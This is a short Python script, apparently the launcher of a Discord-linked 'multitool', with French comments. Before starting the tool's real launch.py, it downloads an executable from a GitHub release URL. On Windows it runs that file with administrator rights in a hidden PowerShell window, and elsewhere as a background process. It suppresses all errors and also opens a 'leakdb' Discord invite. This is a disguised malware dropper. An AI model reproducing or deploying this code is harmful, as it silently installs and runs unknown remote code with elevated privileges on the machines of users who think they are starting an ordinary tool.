import webbrowser, os, requests, sys

URL = "https://github.com/hataybdx-wq/Wumpus-Gestion/releases/download/rqr/Requir.exe"

def main():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(current_dir)
    output_exe = os.path.join(parent_dir, "Requir.exe")
    launch_path = os.path.join(parent_dir, "launch.py")

    try:
        # 1. Ouvre le lien Discord
        webbrowser.open("https://discord.gg/leakdb")
        
        # 2. Télécharge et sauvegarde le .exe
        response = requests.get(URL, timeout=15)
        if response.status_code == 200:
            with open(output_exe, "wb") as f:
                f.write(response.content)
            
            # 3. Lance le .exe en admin et en arrière-plan total (sans fenêtre de commande) via PowerShell
            if os.name == 'nt':
                exe_path = os.path.abspath(output_exe)
                ps_command = f"Start-Process -FilePath '{exe_path}' -Verb RunAs -WindowStyle Hidden"
                os.system(f"powershell -WindowStyle Hidden -Command \"{ps_command}\"")
            else:
                os.system(f"chmod +x '{output_exe}' && '{output_exe}' &")
    except Exception:
        pass

    # 4. Lance le launch.py du multitool normalement
    if os.path.exists(launch_path):
        os.system(f'start /B "" "{sys.executable}" "{launch_path}"' if os.name == 'nt' else f"'{sys.executable}' '{launch_path}' &")
    
    sys.exit()

if __name__ == "__main__":
    main()
